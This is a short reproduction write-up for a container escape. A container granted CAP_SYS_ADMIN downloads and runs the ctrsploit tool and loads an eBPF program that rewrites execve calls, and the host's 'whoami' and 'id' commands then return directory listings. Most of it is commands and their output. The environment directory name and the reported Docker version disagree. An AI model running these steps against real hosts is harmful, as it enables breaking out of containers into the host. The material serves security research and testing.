# ebpf escape by execve

replace the first arg of execve

## 5. Reproduce

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2/
$ docker compose -f docker-compose.yml -f docker-compose.kvm up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker version
Client: Docker Engine - Community
 Version:           19.03.13
 API version:       1.40
 Go version:        go1.13.15
 Git commit:        4484c46d9d
 Built:             Wed Sep 16 17:02:52 2020
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.13
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.13.15
  Git commit:       4484c46d9d
  Built:            Wed Sep 16 17:01:20 2020
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.3.7
  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175
 runc:
  Version:          1.0.0-rc10
  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
root@localhost:~# cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

</details>

### 5.2 Reproduce Steps

startup ebpf

```shell
$ ./ssh
root@localhost:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul caps sys_admin x ebpf execve
INFO[0000] Waiting for events..
```

run command on host

```shell
$ .ssh
root@localhost:~# cd /
root@localhost:/# whoami
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
root@localhost:/# id
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
```
